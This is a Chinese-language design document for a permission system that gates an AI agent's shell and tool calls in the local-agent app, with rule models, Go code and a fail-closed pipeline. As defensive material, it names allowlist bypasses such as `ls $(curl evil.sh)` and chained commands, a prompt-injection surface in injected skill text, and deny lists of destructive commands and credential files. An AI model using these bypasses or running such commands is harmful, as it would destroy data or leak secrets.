# local-agent 权限管理实现方案（开发依据）

> - 项目：`local-agent`（Wails v2 + Go 后端 + Vue 3 前端）
> - 状态：待评审
> - 用途：为 local-agent 引入对标 Claude Code 的工具权限管控。本文档给出机制解析、规则模型、数据契约、拦截点选型、前后端协议与分阶段落地计划。
> - **前置说明**：项目此前存在过一版 `permissionMode` 字段，因**从未落地实现**（仅有一个绑到不存在字段的空壳下拉框）已于 2026-09-15 全量移除（前端 UI + Go 结构体 + 生成绑定）。本文档是一次**从零开始的设计，不是恢复旧字段**。`docs/frontend-design.md`、`docs/skills-implementation-plan.md` 中残留的权限描述属历史文档，不作为本文依据。

---

## 实施状态（2026-09-15 更新）

P0–P3 已实现完毕，见分支 `feature/permission-management`。落地时对本文档有**五处有意偏离**，以此处为准：

| # | 文档原方案 | 实际实现 | 原因 |
| --- | --- | --- | --- |
| 1 | 前缀匹配「边界只认空白」（5.2） | 边界改为「后续字符是否为命令名继续字符」（字母/数字/`_`/`-`/`.` 视为继续，其余视为分隔符） | 只认空白会让路径前缀失效：`rm -rf /tmp/keep:*` 无法命中 `rm -rf /tmp/keep/x`。改后仍能挡住 `git:*` 误配 `github-cli`，同时支持路径前缀 |
| 2 | 内置 deny 含 `dd if=:*`（5.6） | 去掉裸 `dd if=` 前缀，改用 `of=/dev/` 包含匹配 | `dd if=input.img of=output.img`（合法磁盘镜像）会被前缀误杀，而这份名单**不可撤销**，精度优先 |
| 3 | 内置名单全部归入 deny（5.6） | 拆成两层：**灾难性且不可逆**的进 deny（`rm -rf /`、`mkfs`、`of=/dev/` 等）；**敏感路径**（`.env`、`id_rsa`、`.aws/credentials` 等）归入 **ask** | 「防误读」与「防破坏」不是一回事。读取 `.env` 常常是正常排障，硬拒会阻断工作；归入 ask 后仍强制人工确认，且可在弹窗当场批准 |
| 4 | 未指定拒绝如何传到前端 UI | 新增哨兵错误 `ErrPermissionDenied` + `PermissionDeniedError`，`chat.go` 据此把工具卡片状态标为 `denied` | 文档只在 5.8 提到 `denied` 状态，但没说后端怎么区分。被权限拒绝与命令执行报错对用户是两件事，不能都显示成「失败」 |
| 5 | `acceptEdits` 延后到 P2（5.5） | 已实现 | 既然 P3 一并做，顺手实现；语义仍按 5.5 的说明（仅放行 `mkdir`/`touch`/`mv`/`cp`/`ln`/`install`/`truncate` 这类文件系统命令） |

其他实现细节：

- **「匹配串 == 执行串」的同源性**：`DescribeOperation` 与 `Execute` 共用 `renderTemplate(cliCfg.Command, args)`，由 `permission_test.go` 的 T15 守住。
- **审计与授权挂在 App 而非引擎**（文档未指定）：设置页改规则会重建引擎，而「本会话授权」与审计必须跨重建保留。故 `GrantStore` / `AuditLog` 由 App 按 sessionID 持有，引擎只持引用。
- **未能验证的部分**：本机无 Go 工具链（`apt` 无 root，且 `go.mod` 要求 1.25），`go build` / `go test` / `gofmt` 均未运行；`vite build` 因缺 Linux 版 rollup 原生模块也无法运行。前端改用 `@vue/compiler-sfc` 编译校验 + `node --check` 语法校验，Go 侧用词法级括号平衡脚本与人工复核。**合并前请务必本地跑一次 `go build ./... && go test ./...` 与 `gofmt -l .`** —— 仓库现有 Go 代码本身并非严格 gofmt 格式，新代码采用的是「名字/类型列对齐、标签与注释前留一个空格」的风格。

---


## 一、背景与目标

### 1.1 为什么现在要做

local-agent 目前的工具执行是**完全无管控**的。模型可以经 `exec_shell` 在本机执行任意 shell 命令，且执行前没有任何确认、没有白名单、没有审计。`docs/project-report.md` 第 77 行早已把这一点标记为待办：

> 安全：`exec_shell` 可执行任意本机命令，建议增加命令白名单或执行前确认。

除了 `exec_shell`，还有三条被低估的风险面：

| 风险面 | 位置 | 说明 |
| --- | --- | --- |
| 任意命令执行 | `tools.go:47-60` `CLITool.Execute` | `bash -c` / `powershell -Command` 直通，**且忽略传入的 ctx、无超时** |
| 自定义 CLI 工具命令注入 | `toolruntime.go:51-79` `DynamicCLITool.Execute` | 把 `{{参数}}` 模板渲染进命令行后交给 shell，模型可控参数直接参与拼接 |
| 提示注入面 | `skills.go:381` `BuildAlwaysInjectBlock` | 标记 `alwaysInject` 的技能正文被**原样拼进 system prompt**，技能来源若不可信即可写入指令 |
| 未经工具通道的进程创建 | `toolruntime.go:212-220` `MCPPool.Connect` stdio 分支 | 装配阶段 `exec.Command(cfg.Command, ...)` 拉起子进程，**不经过任何工具执行入口** |

最后一条尤其关键：它说明**只靠提示词自律是不够的**，必须在执行层拦截。

### 1.2 目标

| 编号 | 目标 | 优先级 |
| --- | --- | --- |
| G1 | 工具执行前的统一决策点（allow / ask / deny 三态），默认 **fail closed** | P0 |
| G2 | 规则模型：按「工具 + 参数限定符」匹配，而非仅按工具名 | P0 |
| G3 | 权限模式（default / acceptEdits / plan / bypassPermissions） | P0 |
| G4 | 询问-应答回路：后端阻塞等待，前端弹窗作答 | P0 |
| G5 | 授权分级：本次 / 本会话 / 永久（写入项目配置） | P1 |
| G6 | 配置分层：内置默认 < 用户全局 < 项目 < 项目本地，列表合并、标量覆盖 | P1 |
| G7 | 规则可视化查看与编辑（对标 `/permissions`） | P2 |
| G8 | 命令分解与命令替换检测，堵住 shell 绕过 | P2 |

### 1.3 非目标（本期不做）

- **沙箱隔离**（OS 级文件系统/网络边界，对标 Claude Code 的 bubblewrap / sandbox-exec）：与权限规则是互补关系而非替代，本期只预留扩展点，见 9.2
- **PreToolUse / PostToolUse hooks**：本期只预留接口，不做用户可配置的脚本钩子
- **AI 分类器自动审批**（对标 Claude Code 较新的 auto 模式）：需要额外 LLM 调用与延迟预算，本期不做
- 企业级托管策略（managed settings）与多人策略分发
- 工具**发现**阶段的管控（MCP 连接时拉子进程）——列为已知缺口 R3，本期用一次性授权缓解

---

## 二、现状盘点

### 2.1 已有能力（可直接复用）

| 层 | 文件 | 现状 | 对权限系统的价值 |
| --- | --- | --- | --- |
| 后端 | `tools.go:16-38` | `ToolInterface`（`Execute/GetName/GetDescription/GetParameters`）+ `BaseTool` | **新增字段的落点**：目前无任何只读/危险标记 |
| 后端 | `tools.go:245-311` | `ToolManager.BuildView()` 按会话白名单装配 `registry` | **拦截点首选**（见 5.1） |
| 后端 | `tools.go:314-334` | `GetToolsForLLM()` **只把 `tool_router` 暴露给 LLM** | 决定了「真实工具名」必须从参数里解包（见 4.2） |
| 后端 | `tools.go:206` | `MetaTool.executeTool` → `targetTool.Execute` | **真实工具的单一漏斗** |
| 后端 | `chat.go:530-578` | 工具调用循环：emit `tool_call_start` → `ExecuteTool` → emit `tool_call_end` | 交互实现的挂载点 |
| 后端 | `chat.go:384-391` | `ChatEvent{Type string, ...}`，`Type` 为开放字符串 | 新增 `permission_request` **零破坏** |
| 后端 | `app.go:30-56` | `startup` 保存 `a.ctx`，`EventsEmit(a.ctx, ...)` 已在 5 处使用 | **后端→前端通道已完备** |
| 后端 | `app.go:59-69` | `dataDir()` = `~/.local-agent/` | 全局配置落点 |
| 后端 | `app.go:346` | `resolveProjectDir(sessionID)` 已存在 | **项目级配置目录解析可直接复用** |
| 后端 | `toolstore.go:34-47` | `ToolConfig` JSON 持久化，`json.Unmarshal` 对缺失字段宽容 | 新增策略字段**无需数据迁移** |
| 后端 | `sessions.go:49-63` | `Session.EnabledTools / EnabledSkills` 白名单 | 会话级授权的**现成范式** |
| 前端 | `api/session.js` | `EventsOn('chat:event')` + `switch(type)` 分派 | 加一个 `case` 即可接收权限请求 |
| 前端 | `stores/chat.js` | `addToolCall / updateToolCall` | 加权限状态的分支 |
| 前端 | `components/business/ToolEditDialog.vue` | `props.visible` + `watch` 重置的弹窗范式 | 权限询问弹窗的**模板** |
| 前端 | `components/business/ToolCallCard.vue:11-34` | 按 `status` 着色 | 加 `pending/denied` 两个 case |

### 2.2 关键缺口（现有代码里完全没有的）

| 编号 | 缺口 | 影响 |
| --- | --- | --- |
| N1 | **前端→后端的应答回路** | `EventsEmit` 是单向 fire-and-forget，后端无法等待用户作答 |
| N2 | **可取消的 context** | `chat.go:482/506` 全程 `context.Background()`；前端 `stopGeneration()`（`ChatPane.vue:251`）只改本地标志位，**后端仍在跑** |
| N3 | Go 侧全局 settings store | 目前只有前端 localStorage（`stores/setting.js`），后端读不到，无法在决策时使用 |
| N4 | `CLITool` 超时/ctx 支持 | `tools.go:47-60` 忽略 ctx 且无超时，批准后仍可能挂死 |
| N5 | 浏览器 mock 同步机制 | `api/tool.js` 的 `defaultMockTools()` 需同步新增字段，否则 dev 模式行为分叉 |

### 2.3 现状与 Claude Code 的差距

| 维度 | Claude Code | local-agent 现状 | 差距 |
| --- | --- | --- | --- |
| 执行前决策 | deny → ask → allow 三层规则 | 无 | 需新建 |
| 规则粒度 | 工具 + 参数限定符（`Bash(git:*)`） | 无 | 需新建 |
| 权限模式 | default / acceptEdits / plan / bypassPermissions | 无 | 需新建 |
| 配置分层 | 企业 > CLI > 项目本地 > 项目 > 用户 | 无（仅前端 localStorage 单层） | 需新建 |
| 交互确认 | 终端内联确认，可附评论 | 无 | 需新建（改为应用内弹窗） |
| 授权持久化 | 命令/域名写 `settings.local.json`；文件编辑仅本会话 | 无 | 需新建 |
| 审计与可视化 | `/permissions` 列出规则及来源文件 | 无 | 需新建 |
| 沙箱 | OS 级隔离作为第二道防线 | 无 | 本期不做 |

---

## 三、Claude Code 权限机制解析（对标依据）

> **可信度说明**：Claude Code 未开源。本章内容基于两类来源，请按标注区别对待：
> - **【明确】**：本人知识范围内（截至 2025-05）、且经本次检索摘要相互印证的部分，可信度高。
> - **【较新】**：本人知识截止之后新增的能力，仅来自检索摘要，**未取得官方文档原文核实**（本次会话的文档抓取被网络 allowlist 拦截，无法直接核对 `docs.claude.com`）。作为方向参考可以，**不要当作精确规格实现**。
>
> 本方案只对齐其**可观测行为**，不假设其内部实现。

### 3.1 三层规则：【明确】

权限规则分为 `allow` / `ask` / `deny` 三个列表，配置在 `settings.json` 的 `permissions` 字段下。

规则语法为 `ToolName` 或 `ToolName(specifier)`：

| 工具 | 规则示例 | specifier 语义 |
| --- | --- | --- |
| `Bash` | `Bash(git commit:*)` | 命令前缀匹配，`:*` 表示「该前缀及其后任意内容」 |
| `Read` | `Read(./src/**)` | 路径 glob，支持 `**` 递归 |
| `Edit` / `Write` | `Edit(docs/**)` | 同上 |
| `WebFetch` | `WebFetch(domain:example.com)` | 域名精确匹配 |
| MCP 工具 | `mcp__github__create_issue` | `mcp__<server>__<tool>`，通配符仅允许出现在 server 段之后 |

裸工具名（如 `Bash`）的语义是**整个工具**——检索摘要提到它会「把该工具从上下文中移除」，这一点我倾向于理解为规则作用于工具级而非单次调用，实现时按「匹配该工具的全部调用」处理更稳妥。

### 3.2 求值顺序：【明确】

```
deny 规则 → ask 规则 → allow 规则 → 默认（询问）
```

两条关键性质：

1. **deny 绝对优先**：即使存在更具体的 allow 规则，deny 仍然胜出。检索摘要的表述是「更窄的 Allow 规则不会覆盖命中的 Deny 或 Ask」。
2. **deny 在 `bypassPermissions` 模式下依然生效**——这是「绕过」不等于「关掉安全网」的设计。

第 2 条直接决定了本方案 4.3 的决策顺序：**deny 必须排在模式判定之前**。

### 3.3 默认行为：【明确】

**fail closed**——未匹配任何规则的操作默认需要人工批准。这是整个设计的核心安全性质，也是抵御提示注入的主要手段：注入的指令无法自行获得授权，因为授权来自用户而非模型。

工具分类上，**只读工具免确认**（读文件、搜索、列目录等），**写文件 / 执行命令 / 网络请求默认需要确认**。

### 3.4 权限模式：【明确】四项 +【较新】两项

| 模式 | 语义 | 可信度 |
| --- | --- | --- |
| `default`（Manual） | 未匹配的写操作/命令 → 询问 | 【明确】 |
| `acceptEdits` | 自动批准文件编辑与常见文件系统命令（`mkdir`/`touch`/`mv`/`cp`），其他仍询问 | 【明确】 |
| `plan` | 只读；禁止修改文件与执行命令 | 【明确】 |
| `bypassPermissions` | 几乎全部自动批准，**deny 规则与 hooks 仍生效** | 【明确】 |
| `auto` | 用 AI 分类器判断是否可自动批准 | 【较新】 |
| `dontAsk` | 把「询问」直接转成「拒绝」，仅 allow 规则放行 | 【较新】 |

本方案只实现前四项，理由见 5.5。

### 3.5 配置分层：【较新】

优先级从高到低（检索摘要，未取得原文核实）：

```
企业托管 settings  >  CLI 参数  >  .claude/settings.local.json
                  >  .claude/settings.json  >  ~/.claude/settings.json
```

合并策略是**本次设计里最重要的一条经验**：

- `allow` / `ask` / `deny` 三个列表在不同层级间 **合并（union）** —— 高层级不能「删掉」低层级的规则
- 标量字段（如 `defaultMode`）**高优先级覆盖低优先级**
- `additionalDirectories` 等列表也合并

「列表合并」意味着 deny 一旦在某层写入就无法被上层撤销。这对安全有利，但要求 deny 名单必须克制、可审计。

### 3.6 授权持久化位置：【明确】

| 授权类型 | 持久化位置 | 生命周期 |
| --- | --- | --- |
| 命令类、域名类「总是允许」 | `.claude/settings.local.json` | 跨会话，随项目，不提交版本控制 |
| 文件编辑批准 | **仅当前会话** | 会话结束失效 |

**这个不对称是有意设计**：文件编辑的授权扩散风险高于命令前缀授权，因此不给持久化。本方案沿用这一区分（见 5.6）。

### 3.7 Hooks 与沙箱（本期不实现，仅作扩展点）

- **Hooks**【明确】：`PreToolUse` 可在规则之前介入，能拒绝、能修改工具入参；方向是**只能收紧不能放宽**——hook 的 deny 无法被 allow 规则或 `bypassPermissions` 覆盖。`PostToolUse` 用于审计与校验。
- **沙箱**【明确】：OS 级隔离（Linux/WSL2 用 `bubblewrap`，macOS 用 `sandbox-exec`），提供内核强制的文件系统与网络边界。与规则系统是**互补**：规则是应用层「执行前」判断，沙箱是内核层「执行时」强制。规则可能被绕过，沙箱不会。

### 3.8 已知弱点（直接影响本方案设计）

| 弱点 | 说明 | 对本方案的启示 |
| --- | --- | --- |
| **命令替换绕过** | 允许 `Bash(ls:*)` 时，`ls $(curl evil.sh)` 会连 `curl` 一起执行——因为 `curl` 是替换结果，与 allowlist 无关 | 必须做命令分解 + 替换检测（见 5.7） |
| **复合命令绕过** | `&&`、`\|\|`、`;` 等操作符串联时，若只检查第一段，后续段不受约束 | 分解后**逐段判定**，任一段不过则整条不过 |
| 域名白名单不支持通配 | 需逐个列举子域 | 本方案的 domain 匹配直接支持 `*.` 通配，避免复刻该缺陷 |
| 规则粒度依赖 shell 静态分析 | shell 语义复杂，静态判定不可能完备 | **解析不确定时降级为询问**（fail closed），而非猜测 |

最后一条是本方案的基本立场：**不追求「解析完备」，追求「不确定就不放行」**。

---

## 四、方案选型与总体设计

### 4.1 拦截点选型

三个候选，逐一比较：

| 方案 | 做法 | 覆盖率 | 改动量 | 结论 |
| --- | --- | --- | --- | --- |
| A. `chat.go` 主循环插桩 | 在 `chat.go:549`（emit start）与 `:556`（ExecuteTool）之间插入检查 | 仅主循环 | 小 | **不采用** |
| B. `SessionView.ExecuteTool` 内检查 | 在 `tools.go:337` 入口处拦截 | 名义全覆盖 | 小 | **不采用** |
| C. **装配期装饰器** | `BuildView` 里把每个 `ToolInterface` 包一层 `guardedTool` | **全覆盖** | 中 | ✅ **采用** |

**为什么 A 不行**：`tc.Function.Name` 在这里恒为 `tool_router`（因为 `GetToolsForLLM()` 只暴露它），真实工具名藏在 `args["tool_name"]` 里。在 A 处检查等于每次都在检查「工具路由器」，毫无意义；要让它可用就得在 chat.go 里写解包逻辑，把权限知识与主循环耦合。

**为什么 B 也不行**：B 与 A 有**同一个缺陷**——`SessionView.ExecuteTool(name, args)` 收到的 `name` 同样是 `tool_router`（`chat.go:556` 传的就是 `tc.Function.Name`），要判定真实工具仍须解包 `args`，而且它拿不到该工具对应的 `*ToolConfig`（风险级别、类型都无从得知）。B 唯一比 A 好的地方是能覆盖 `nonMeta` 直调路径，但那条路径本来就不是主循环的入口。

**为什么 C 更好**：装饰器包在**真实工具**上，天然拿到真实工具名与参数：

1. `registry` 这个 map 被同时传给 `SessionView.nonMeta`（`tools.go:308`）和 `NewMetaTool(registry, typeMap)`（`tools.go:309`）。**包一次，两个入口同时堵住**：
   - 入口 A：`SessionView.ExecuteTool` → `v.nonMeta[name].Execute`（`tools.go:345`）
   - 入口 B：`SessionView.ExecuteTool` → `v.meta.Execute` → `MetaTool.executeTool` → `targetTool.Execute`（`tools.go:206`）← **真实漏斗**
2. `read_skill`（`tools.go:301-304`）与 MCP 子工具（`tools.go:287-295`）**自动被覆盖**
3. 不动 `chat.go` 主循环，不动任何 `Execute` 实现
4. 装配点天然持有 `*ToolConfig`（含 `Type`、未来的策略字段）与会话上下文

### 4.2 tool_router 解包：本项目独有的关键约束

因为只有 `tool_router` 暴露给 LLM，一次真实调用长这样：

```json
{
  "name": "tool_router",
  "arguments": {
    "action": "execute",
    "tool_name": "exec_shell",
    "arguments": { "cmd": "git status" }
  }
}
```

装饰器方案的直接好处：**包在 `exec_shell` 上，它看到的就是 `{"cmd": "git status"}`**，不需要解包。但有两处仍需显式处理：

- **弹窗展示**：前端收到的事件里必须给出**真实**工具名（`exec_shell`）和**真实**参数（`git status`），不能只显示 `tool_router`。因此在 `BuildView` 装配时把真实工具名写入 `guardedTool`，请求事件由它发出。
- **`read_skill` 等内置工具**同样经装饰器，无需特判。

### 4.3 决策管线（核心算法）

```
工具调用（guardedTool.Execute）
  │
  ├─ 0. 归一化：构造 PermissionSubject（真实工具名/类型/命令/域名/风险级别）
  │
  ├─ 1. deny 规则命中            → 【拒绝】 绝对优先，模式与授权均不可覆盖
  │
  ├─ 2. plan 模式 且 非只读       → 【拒绝】
  │
  ├─ 3. ask 规则命中             → 【询问】
  │
  ├─ 4. 会话内授权命中            → 【放行】（本次/本会话/永久授权）
  │
  ├─ 5. bypassPermissions 模式   → 【放行】
  │
  ├─ 6. acceptEdits 且 文件编辑   → 【放行】
  │
  ├─ 7. allow 规则命中            → 【放行】
  │
  ├─ 8. 只读工具（RiskRead）      → 【放行】
  │
  └─ 9. 兜底                     → 【询问】 ← fail closed
```

与 Claude Code 的差异及理由：

| 差异 | 理由 |
| --- | --- |
| deny 提到最前（在模式判定之前） | 对齐「deny 在任何模式下都生效」的性质 |
| plan 模式的拒绝紧随 deny | plan 是「只读」承诺，不应被会话授权突破 |
| `ask` 规则排在会话授权**之前** | **有意为之**：`ask` 规则的语义是「该操作必须每次确认」，应压过历史授权。代价是用户点了「永久允许」后，若该命令同时命中 `ask` 规则仍会继续询问——界面必须提示「本次询问由 ask 规则 X 触发」，否则会被当成 bug（见 R14） |
| 会话授权排在模式判定**之前** | 否则 `default` 模式下每次询问都会重复；会话授权的目的就是止住重复询问 |
| 第 8 步只读工具直接放行 | 对齐 Claude Code「只读工具免确认」，同时避免为读操作弹窗 |

### 4.4 设计原则

1. **Fail closed**：任何不确定 —— 规则解析失败、命令解析失败、请求超时、无人在前端应答 —— 一律降级为拒绝或询问，**绝不静默放行**。
2. **deny 不可覆盖**：deny 是安全底线，优先于模式、授权与 allow 规则。
3. **授权必须来自用户**：模型无法自行授权。拒绝结果要以工具错误形式回填给 LLM，让它知道被拒并调整（复用 `chat.go:559-563` 的既有路径，**无需改动回填逻辑**）。
4. **决策与实现解耦**：规则匹配只依赖 `PermissionSubject` 这一归一化结构，不依赖具体工具实现，新增工具类型不需要改引擎。
5. **可审计**：每条决策都带「命中了哪条规则、规则来自哪个文件」，供界面展示与日志。

---

## 五、详细设计

### 5.1 数据契约：Go 侧结构体（新增文件 `permission.go`）

```go
package main

// ===== 决策三态 =====

type Decision int

const (
	DecisionAsk Decision = iota // 零值即询问 —— 保证 fail closed
	DecisionAllow
	DecisionDeny
)

// ===== 风险级别（决定默认策略）=====

type RiskClass string

const (
	RiskRead    RiskClass = "read"    // 只读，默认放行：read_skill
	RiskWrite   RiskClass = "write"   // 修改本机状态，默认询问：exec_shell、cli
	RiskNetwork RiskClass = "network" // 出网，默认询问：api、远端 mcp
	RiskProcess RiskClass = "process" // 拉起进程，默认询问：stdio mcp
)

// ===== 归一化判定对象（规则匹配的唯一输入）=====

type PermissionSubject struct {
	ToolID   string                 `json:"toolId"`   // ToolConfig.ID
	ToolName string                 `json:"toolName"` // 真实工具名（非 tool_router）
	ToolType string                 `json:"toolType"` // builtin/cli/mcp/api
	Risk     RiskClass              `json:"risk"`
	Command  string                 `json:"command,omitempty"`  // builtin/cli 渲染后的命令行
	Domain   string                 `json:"domain,omitempty"`   // api 目标 host
	Argv     []string               `json:"argv,omitempty"`     // 分解后的子命令
	Raw      map[string]interface{} `json:"raw"`                // 原始参数，供界面展示
}

// Specifiable 由「需要权限匹配的工具」实现：把原始参数归一化为判定对象。
//
// 为什么必须有这个接口：装饰器只能拿到**未渲染的原始参数**，而 DynamicCLITool
// （toolruntime.go:51-79）的命令行是 `{{参数}}` 模板在 Execute 内部才渲染出来的。
// 如果由装饰器自己拼命令行，就必须复刻一遍模板渲染逻辑 —— 一旦两边不一致，
// 匹配的字符串和实际执行的命令就会分叉，这是最危险的一类漏洞
// （规则放行 A、实际执行 B）。因此把「描述自己要执行什么」交回工具自己实现，
// 保证 match 的字符串与 exec 的字符串同源。
type Specifiable interface {
	DescribeOperation(args map[string]interface{}) PermissionSubject
}

// ===== 规则 =====

type Rule struct {
	Raw    string `json:"raw"`    // 原文，用于界面回显
	Tool   string `json:"tool"`   // 工具名部分
	Spec   string `json:"spec"`   // 限定符（可为空 = 工具级）
	Source string `json:"source"` // 来源标识，用于审计：builtin/user/project/local
}

type RuleSet struct {
	Allow []Rule `json:"allow"`
	Ask   []Rule `json:"ask"`
	Deny  []Rule `json:"deny"`
}

// ===== 权限模式 =====

type PermissionMode string

const (
	ModeDefault      PermissionMode = "default"
	ModeAcceptEdits  PermissionMode = "acceptEdits"
	ModePlan         PermissionMode = "plan"
	ModeBypass       PermissionMode = "bypassPermissions"
)

// ===== 引擎 =====

type PermissionEngine struct {
	rules   RuleSet
	mode    PermissionMode
	grants  *GrantStore  // 会话内授权
	asker   Asker        // 询问实现；nil 表示无人可问 → 拒绝
	audit   func(ev AuditEntry)
}

// Asker 询问实现：生产环境发事件并阻塞等待，测试环境注入固定答案
type Asker interface {
	Ask(ctx context.Context, req PermissionRequest) (PermissionDecision, error)
}

type PermissionDecision struct {
	Allow  bool   `json:"allow"`
	Scope  string `json:"scope"`  // once | session | always
}
```

`Decision` 的**零值是 `DecisionAsk`** —— 这样任何「忘了赋值」的代码路径都会走向询问而不是放行，是 fail closed 在类型层面的兜底。

### 5.2 规则匹配算法

```go
// Authorize 是唯一的决策入口，纯函数（除 asker 与 grants 的副作用）
func (e *PermissionEngine) Authorize(ctx context.Context, sub PermissionSubject) (Decision, string) {
	// 1. deny 绝对优先
	if r, ok := e.rules.matchDeny(sub); ok {
		return DecisionDeny, "deny 规则命中: " + r.Raw + "（来源 " + r.Source + "）"
	}

	// 2. plan 模式：非只读一律拒绝
	if e.mode == ModePlan && sub.Risk != RiskRead {
		return DecisionDeny, "plan 模式仅允许只读操作"
	}

	// 3. ask 规则
	if r, ok := e.rules.matchAsk(sub); ok {
		if d, ok := e.askUser(ctx, sub, "ask 规则命中: "+r.Raw); ok {
			return d, "ask 规则命中: " + r.Raw
		}
		return DecisionDeny, "ask 规则命中但无人应答"
	}

	// 4. 会话内授权
	if g, ok := e.grants.Match(sub); ok {
		return DecisionAllow, "会话授权: " + g.Describe()
	}

	// 5. bypassPermissions
	if e.mode == ModeBypass {
		return DecisionAllow, "bypassPermissions 模式"
	}

	// 6. acceptEdits：仅文件编辑类
	if e.mode == ModeAcceptEdits && sub.Risk == RiskWrite && isFileEdit(sub) {
		return DecisionAllow, "acceptEdits 模式自动批准文件编辑"
	}

	// 7. allow 规则
	if r, ok := e.rules.matchAllow(sub); ok {
		return DecisionAllow, "allow 规则命中: " + r.Raw
	}

	// 8. 只读工具默认放行
	if sub.Risk == RiskRead {
		return DecisionAllow, "只读工具默认放行"
	}

	// 9. 兜底：fail closed
	if d, ok := e.askUser(ctx, sub, "未匹配任何规则，默认询问"); ok {
		return d, "未匹配任何规则，用户决定"
	}
	return DecisionDeny, "无匹配规则且无人应答，默认拒绝"
}
```

**匹配规则细节**：

| 规则形式 | 匹配逻辑 |
| --- | --- |
| 裸工具名 `exec_shell` | `sub.ToolName == "exec_shell"`，匹配该工具全部调用 |
| 命令前缀 `exec_shell(git:*)` | `sub.ToolName == "exec_shell"` 且命令以 `git` 开头（后接任意内容） |
| 命令通配 `exec_shell(npm run test:*)` | 同上，前缀为 `npm run test` |
| 精确命令 `exec_shell(git status)` | 命令行**完全相等** |
| 域名 `my_api(domain:api.example.com)` | `sub.Domain` 精确相等 |
| 域名通配 `my_api(domain:*.example.com)` | 后缀匹配（**修复 Claude Code 不支持通配的缺陷**） |
| 技能 `read_skill(pdf-report)` | 参数中的技能 id 相等 |
| MCP 子工具 `mcp__github__create_issue` | 工具名精确匹配（名字本身已含前缀） |

匹配顺序上，**具体规则优先于通配规则**：引擎先尝试所有「精确/长前缀」规则，再尝试通配规则。同层内若多条命中，取最具体的一条记入审计。

### 5.3 拦截点：装饰器实现

```go
// guardedTool 包装真实工具，在 Execute 前插入权限决策
type guardedTool struct {
	inner ToolInterface
	cfg   *ToolConfig
	eng   *PermissionEngine // nil = 放行（测试与未启用权限时）
}

func (g *guardedTool) Execute(ctx context.Context, args map[string]interface{}) (string, error) {
	if g.eng == nil {
		return g.inner.Execute(ctx, args) // 直通，保证既有单测不受影响
	}

	sub := buildSubject(g.inner, g.cfg, args)
	decision, reason := g.eng.Authorize(ctx, sub)

	switch decision {
	case DecisionDeny:
		g.eng.audit(AuditEntry{Subject: sub, Decision: decision, Reason: reason})
		// 以 error 返回：chat.go:559-563 会写成「执行失败: ...」回填给 LLM
		return "", fmt.Errorf("操作被权限策略拒绝：%s", reason)

	case DecisionAllow:
		g.eng.audit(AuditEntry{Subject: sub, Decision: decision, Reason: reason})
		return g.inner.Execute(ctx, args)

	default: // DecisionAsk 未被 Asker 消化 —— 视为拒绝
		return "", fmt.Errorf("需要用户授权但未获得应答，已拒绝")
	}
}

// 其余方法透传，保持 ToolInterface 契约
func (g *guardedTool) GetName() string        { return g.inner.GetName() }
func (g *guardedTool) GetDescription() string { return g.inner.GetDescription() }
func (g *guardedTool) GetParameters() map[string]*ToolArgDef { return g.inner.GetParameters() }
```

```go
// buildSubject 优先采用工具自述的操作描述；工具未实现 Specifiable 时
// 退化为「仅按工具名 + 类型判定」——此时所有带限定符的规则都不会命中，
// 于是必然落到兜底询问，仍然是 fail closed 的安全方向。
func buildSubject(t ToolInterface, cfg *ToolConfig, args map[string]interface{}) PermissionSubject {
	if sp, ok := t.(Specifiable); ok {
		return sp.DescribeOperation(args)
	}
	return PermissionSubject{
		ToolID:   cfg.ID,
		ToolName: cfg.Name,
		ToolType: cfg.Type,
		Risk:     riskOf(cfg),
		Raw:      args,
	}
}
```

**两处实现注意事项**

1. **必须让 `exec_shell` 与 `DynamicCLITool` 都实现 `Specifiable`**，且实现里给出的是**最终真正要执行的命令行**（`DynamicCLITool` 需把渲染后的结果而非模板原文返回），否则限定符规则匹配的是一个字符串、执行的是另一个——这正是该接口存在的理由。
2. **错误会被包两层**：装饰器返回的 error 先被 `MetaTool.executeTool`（`tools.go:208`）包成 `工具 exec_shell 执行失败: …`，再被 `chat.go:562` 包成 `执行失败: …`。最终回填给 LLM 的文本形如 `执行失败: 工具 exec_shell 执行失败: 操作被权限策略拒绝：…`。功能上无害（反而明确了是哪个工具），但措辞重复；建议装饰器侧只返回裸原因，或统一在 `executeTool` 处收敛。

**接入 `BuildView`**（`tools.go:245-311`）——改动集中在两处：

```go
// 签名扩展：新增 eng 参数；nil 表示不启用权限管控（既有测试传 nil 即可）
func (tm *ToolManager) BuildView(ctx context.Context, eng *PermissionEngine,
	enabledWhitelist, skillWhitelist []string) *SessionView {

	registry := map[string]ToolInterface{}
	typeMap := map[string]string{}
	// ... whitelist 逻辑不变 ...

	for _, cfg := range tm.store.GetAll() {
		// ... 过滤逻辑不变 ...
		switch cfg.Type {
		case ToolTypeBuiltin:
			if cfg.Name == "exec_shell" {
				t := &CLITool{BaseTool: &BaseTool{ /* 不变 */ }}
				registry[cfg.Name] = wrap(t, cfg, eng) // ← 包一层
				typeMap[cfg.Name] = ToolTypeBuiltin
			}
		case ToolTypeCLI:
			registry[cfg.Name] = wrap(NewDynamicCLITool(cfg), cfg, eng)
			// ...
		}
	}
	// read_skill 同样 wrap
	// 最后 NewMetaTool(registry, typeMap) 不变 —— 自动继承包装
}
```

`wrap(t, cfg, eng)` 在 `eng == nil` 时直接返回 `t`，避免额外开销。

**调用点改动**：`chat.go:482` 一行

```go
// 原：toolView := a.toolManager.BuildView(context.Background(), session.EnabledTools, session.EnabledSkills)
toolView := a.toolManager.BuildView(ctx, a.permissionEngineFor(session), session.EnabledTools, session.EnabledSkills)
```

### 5.4 前后端交互协议

### 5.4.1 后端 → 前端：请求授权

复用既有 `chat:event` 通道，新增 `type`（`ChatEvent` 的 `Type` 是开放字符串，**零破坏**）：

```json
{
  "type": "permission_request",
  "permission": {
    "requestId": "req-1726380000000-7f3a",
    "toolCallId": "call_abc123",
    "toolName": "exec_shell",
    "toolLabel": "终端命令",
    "toolType": "builtin",
    "risk": "write",
    "command": "rm -rf ./build",
    "argv": ["rm -rf ./build"],
    "summary": "删除 build 目录及其内容",
    "matchedRule": null
  }
}
```

`ChatEvent` 增补一个字段（`omitempty`，不影响既有事件）：

```go
type ChatEvent struct {
	Type       string             `json:"type"`
	ToolCall   *ToolCall          `json:"toolCall,omitempty"`
	Reply      string             `json:"reply,omitempty"`
	Error      string             `json:"error,omitempty"`
	Diff       []DiffFile         `json:"diff,omitempty"`
	Turn       int                `json:"turn,omitempty"`
	Permission *PermissionRequest `json:"permission,omitempty"` // ← 新增
}
```

### 5.4.2 前端 → 后端：应答（**必须新建的回路**）

`EventsEmit` 单向，因此新增一个 bound 方法：

```go
// ResolvePermission 前端对权限询问作答。
